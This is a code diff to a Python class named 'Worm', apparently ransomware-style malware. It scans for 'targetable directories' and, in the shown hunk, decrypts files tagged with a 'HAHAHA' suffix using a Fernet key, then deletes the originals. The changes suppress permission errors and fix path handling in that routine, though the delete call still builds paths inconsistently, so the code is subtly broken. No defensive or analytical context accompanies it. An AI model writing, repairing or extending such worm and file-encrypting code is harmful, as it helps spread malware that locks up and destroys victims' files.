@@ -28,7 +28,7 @@ class Worm:
                                 self.target_dir_list.append(directory_path)
                                 break
                     except PermissionError:
-                        print("PermissionError " + target)
+                        pass
 
         print("[*] Found " + str(len(self.target_dir_list)) + " targetable directories.")
         self.directories_found = True
@@ -82,12 +82,13 @@ class Worm:
 
                 for file in filenames:
                     if file.endswith("HAHAHA"):
-                        with open(target + file, "rb") as f:
+                        print(file)
+                        with open(target + "/" + file, "rb") as f:
                             data = f.read()
 
                         decrypted = fer.decrypt(data)
 
-                        with open(target + file.split("HAHAHA")[0], "wb") as file_dec:
+                        with open(target + "/" + file.split("HAHAHA")[0], "wb") as file_dec:
                             file_dec.write(decrypted)
                         os.remove(target + file)
                         count += 1
